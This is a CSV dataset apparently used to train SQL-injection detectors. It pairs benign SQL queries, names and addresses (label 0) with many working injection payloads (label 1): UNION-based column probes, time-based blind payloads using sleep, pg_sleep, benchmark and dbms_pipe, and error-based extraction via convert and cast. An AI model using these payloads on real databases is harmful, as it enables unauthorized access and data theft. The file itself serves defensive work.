Query,Label
donaldo,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",1
"   SELECT again, final, never FROM disease WHERE fat  IS NULL",0
SELECT * FROM go ORDER BY sharp DESC,0
"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",1
"  SELECT factor,tightly FROM log WHERE make = 'roar' UNION SELECT salt, heading FROM most",0
07559284n,0
SELECT City FROM CustomersUNIONSELECT City FROM SuppliersORDER BY City;,0
SELECT TOP 3 * FROM brief WHERE monkey = 'changing',0
"1 where 1656  =  1656 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
16124624z,0
kaycee,0
"c/ otumba, 132,",0
"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",1
muriel de la fuente,0
tabanera de cerrato,0
ase,0
SELECT COUNT ( DISTINCT round )  FROM pictured,0
"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",1
"  SELECT equallyID AS ID, dance AS hang FROM duck",0
"1""   )    )    as hwlh where 1071  =  1071 union all select null,null,null,null,null,null,null,null#",1
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
1%'   )    )    order by 1--,1
SELECT AVG ( Price ) FROM further,0
80,0
SELECT * FROM species WHERE ill BETWEEN 'give' AND 'declared',0
v5llo34,0
1'||  (  select 'puco' where 2605  =  2605 union all select null#,1
"-4955%' union all select 5928,5928--",1
"1'   )    )    as jvwq where 6596  =  6596 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
6ilia+ria,0
repuesta,0
SELECT * FROM rush ORDER BY important,0
-7231   )    )    union all select 7639#,1
ilusiva,0
SELECT COUNT ( rabbitID ) FROM forth,0
"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",1
SELECT AVG ( remove ) FROM pull SELECT SUM ( war ) ,0
"1%""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1
pillars4,0
SELECT everything ( s )  FROM industry SELECT street ( s ) ,0
DELETE FROM stared WHERE system = 'whole',0
" SELECT column_name ( s )  FROM meal,happened",0
SELECT COUNT ( DISTINCT purple )  FROM even,0
demonlatra,0
SELECT * FROM tightly FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM zulu,0
"1""   )    )    as rpxd where 4929  =  4929",1
SELECT * FROM Customers  WHERE Country = 'Germany'  AND  ( City = 'Berlin' OR City = 'München' ) ;,0
7919,0
axman@culturalsanpedrocf.ie,0
aylmar6,0
select   (  case when   (  7980  =  3703  )   then 7980 else 7980*  (  select 7980 from information_schema.character_sets  )   end  )  #,1
"-5726%""   )    )    or 6872  =  6872 and    (    (   ""%""  =  """,1
26527823z,0
SELECT shot ( s )  FROM height SELECT noun FROM zero,0
end if,1
"select * from generate_series  (  6468,6468,case when   (  6468  =  7999  )   then 1 else 0 end  )   limit 1--",1
"  SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDateFROM OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0
"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
SELECT AVG ( heard )  FROM position  SELECT SUM ( thing ) ,0
4377,0
"  SELECT POWER ( 4, 2 ) ;",0
"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",1
mendiz espn,0
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""endx""  =  ""endx",1
SELECT * FROM themselves 3 SELECT * FROM card,0
"  SELECT * FROM consonant WHERE follow IN  ( 'opinion', 'copy', 'lunch' )  ",0
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk",1
SELECT certainly ( s )  FROM compare FULL OUTER JOIN,0
"-5379'  )   union all select 4294,4294,4294--",1
"   SELECT Employees.count, COUNT ( Orders.stepID )  AS fiftyFROM    ( OrdersINNER JOIN reason ON Orders.panID  =  Employees.signalID ) ",0
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1
SELECT strong,0
02124892z,0
SELECT fur ( s ) FROM classroom INNER JOIN,0
ferreries,0
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",1
wynnie,0
-4308'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'jmot'  =  'jmot,1
"  SELECT eatenID AS ID, at AS push FROM cap",0
"mesas, las",0
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
"SELECT * FROM whatever WHERE atomic BETWEEN ""organization"" AND    ""joined""",0
"masia can giro, 5",0
"ruiz de alda, 78",0
SELECT * FROM they,0
SELECT AVG ( upon )  FROM farm  SELECT SUM ( dust ) ,0
daniza,0
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1
-4108'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'tqjx'  =  'tqjx,1
